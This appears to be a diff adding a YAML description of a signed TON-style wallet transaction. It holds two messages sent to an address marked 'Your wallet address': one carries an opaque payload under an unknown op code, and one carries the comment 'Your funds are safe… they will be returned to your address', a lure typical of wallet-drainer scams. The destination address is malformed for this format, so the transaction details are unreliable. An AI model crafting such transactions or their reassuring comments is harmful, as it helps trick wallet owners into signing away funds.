@@ -1,0 +1,56 @@
+wallet_id: 2147483409
+valid_until: 4294967295
+seqno: 0
+actions:
+  - magic: "0xec3c86d"
+    mode: 3
+    msg:
+      sum_type: MessageInternal
+      message_internal:
+        ihr_disabled: true
+        bounce: true
+        bounced: false
+        src: ""
+        dest: 0:92ce0147DDbd458714893c94fAA8bF00ff0282bE  # Your wallet address
+        value:
+          grams: "20000000"
+          other: {}
+        ihr_fee: "0"
+        fwd_fee: "0"
+        created_lt: 0
+        created_at: 0
+        init: null
+        body:
+          is_right: false
+          value:
+            sum_type: Unknown
+            op_code: 2882400019
+            value: b5ee9c720101050100a7000319abcdef13000ae9ad531a1c00c00102030101d10400802ce6fb13630ff14079cc742d638c169c17fec732523d9b3e6590a3109f7a91eb2d7ddb02a2108daf63e2402161299fc07dfdc801befdae0fa9324c749141b9060043400404f5df6db1c4f32683377eee7b090af79cda80ac51e90caa34af09cb4d7e82c800528014fd693c089ceddb12d1bab91f97d1486950e1e3b4688ffb12a806b328b3afb3200cb5e620f48000
+  - magic: "0xec3c86d"
+    mode: 3
+    msg:
+      sum_type: MessageInternal
+      message_internal:
+        ihr_disabled: true
+        bounce: false
+        bounced: false
+        src: ""
+        dest: 0:92ce0147DDbd458714893c94fAA8bF00ff0282bE  # Your wallet address
+        value:
+          grams: "5319291200"
+          other: {}
+        ihr_fee: "0"
+        fwd_fee: "0"
+        created_lt: 0
+        created_at: 0
+        init: null
+        body:
+          is_right: true
+          value:
+            sum_type: TextComment
+            op_code: 0
+            value:
+              text: 🔒 Your funds are safe, once the transaction is confirmed, they will be
+                returned to your address
+extended: null
+signature: 4acf63d7a42ec4411cd4c83793fa75cfd64dd3dc912adfa881b6900bca73f9ce07a65e2681a78c039b8f49d9026495cfd08e26e70b9c3f88424ff45453cc1102
